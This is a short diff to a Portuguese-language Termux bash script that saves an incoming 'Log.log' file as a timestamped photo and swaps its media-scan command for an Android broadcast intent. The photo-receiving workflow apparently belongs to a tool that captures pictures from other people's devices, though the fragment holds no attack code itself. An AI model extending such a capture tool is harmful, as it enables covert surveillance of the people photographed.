@@ -68,7 +68,7 @@ sleep 0.5
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Recebida!\e[0m\n"
 mv Log.log fotos/$(date +"%Y%m%d%H%M%S").jpg
-termux-media-scan fotos/$(date +"%Y%m%d%H%M%S").jpg
+am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///data/data/com.termux/files/home/fotos/$(date +"%Y%m%d%H%M%S").jpg
 rm -rf Log.log
 fi
 sleep 0.5
